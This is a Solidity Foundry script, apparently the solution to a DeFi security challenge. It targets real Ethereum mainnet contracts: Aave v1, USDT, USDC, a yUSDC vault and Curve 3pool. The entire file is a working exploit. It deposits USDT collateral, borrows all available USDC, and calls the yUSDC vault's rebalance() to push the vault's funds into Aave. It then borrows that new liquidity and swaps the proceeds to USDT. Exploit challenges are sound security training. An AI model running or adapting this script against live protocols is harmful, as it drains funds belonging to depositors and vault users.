// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ILendingPool {
    function deposit(address _reserve, uint256 _amount, uint16 _referralCode) external payable;
    function borrow(address _reserve, uint256 _amount, uint256 _interestRateMode, uint16 _referralCode) external;
    function getReserveData(address _reserve) external view returns (
        uint256 totalLiquidity,
        uint256 availableLiquidity,
        uint256 totalBorrowsStable,
        uint256 totalBorrowsVariable,
        uint256 liquidityRate,
        uint256 variableBorrowRate,
        uint256 stableBorrowRate,
        uint256 averageStableBorrowRate,
        uint256 utilizationRate,
        uint256 liquidityIndex,
        uint256 variableBorrowIndex,
        address aTokenAddress,
        uint40 lastUpdateTimestamp
    );
    function getUserAccountData(address _user) external view returns (
        uint256 totalLiquidityETH,
        uint256 totalCollateralETH,
        uint256 totalBorrowsETH,
        uint256 totalFeesETH,
        uint256 availableBorrowsETH,
        uint256 currentLiquidationThreshold,
        uint256 ltv,
        uint256 healthFactor
    );
}

interface IUSDT {
    function approve(address spender, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
}

interface IyUSDC {
    function rebalance() external;
}

interface ICurve3Pool {
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
}

contract Solution is Script {
    // Core protocol addresses
    address constant AAVE_LENDING_POOL = 0x398eC7346DcD622eDc5ae82352F02bE94C62d119;
    address constant AAVE_CORE = 0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3;
    
    // Token addresses
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    
    // yUSDC contracts
    address constant yUSDC2 = 0xa2609B2b43AC0F5EbE27deB944d2a399C201E3dA;
    
    // Curve 3pool
    address constant CURVE_3POOL = 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;
    
    // Challenge parameters
    address constant WALLET = 0x5A83064c5135204134DEF933eb1678877F9B2017;
    uint256 constant INITIAL_DEPOSIT = 7_000_000e6;
    
    function run() public {
        vm.startBroadcast();
        
        ILendingPool lendingPool = ILendingPool(AAVE_LENDING_POOL);
        IUSDT usdt = IUSDT(USDT);
        IERC20 usdc = IERC20(USDC);
        
        // Step 1: Deposit USDT as collateral
        usdt.approve(AAVE_CORE, type(uint256).max);
        lendingPool.deposit(USDT, INITIAL_DEPOSIT, 0);
        
        // Step 2: Borrow all available USDC liquidity
        (,uint256 availableUSDC,,,,,,,,,,) = lendingPool.getReserveData(USDC);
        lendingPool.borrow(USDC, availableUSDC, 2, 0);
        
        // Step 3: Trigger yUSDC rebalance to add liquidity back to Aave
        IyUSDC(yUSDC2).rebalance();
        
        // Step 4: Borrow the newly available USDC
        (,uint256 newAvailableUSDC,,,,,,,,,,) = lendingPool.getReserveData(USDC);
        if (newAvailableUSDC > 0) {
            lendingPool.borrow(USDC, newAvailableUSDC, 2, 0);
        }
        
        // Step 5: Swap all borrowed USDC to USDT via Curve
        uint256 usdcBalance = usdc.balanceOf(WALLET);
        if (usdcBalance > 0) {
            usdc.approve(CURVE_3POOL, usdcBalance);
            ICurve3Pool(CURVE_3POOL).exchange(1, 2, usdcBalance, 0);
        }
        
        vm.stopBroadcast();
    }
}